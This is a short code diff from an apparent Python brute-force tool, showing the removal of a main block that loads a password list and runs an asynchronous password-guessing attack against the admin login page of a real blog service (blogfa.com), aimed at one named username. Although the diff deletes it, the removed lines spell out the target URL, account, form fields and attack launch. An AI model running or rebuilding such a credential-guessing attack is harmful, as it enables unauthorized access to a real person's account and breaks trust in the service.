@@ -29,26 +29,3 @@ class BruteForceClient(object):
         return {
             password: resp
         }
-
-
-if __name__ == '__main__':
-
-    with open('passwords', 'r') as passwords:
-        pass_list = []
-        pass_lst = passwords.readlines()
-        for p in pass_lst:
-            pass_list.append(p.replace('\n', ''))
-
-    jugger = BruteForceClient(
-        {
-            '_tx': 145662,
-            'usid': 'juggernaut1379',
-            'upwd': None,
-            'btnSubmit': 'ورود به بخش مدیریت وبلاگ'
-        },
-
-        'https://www.blogfa.com/Desktop/Login.aspx',
-        pass_list
-    )
-    loop = get_event_loop()
-    loop.run_until_complete(jugger.bruteforce())
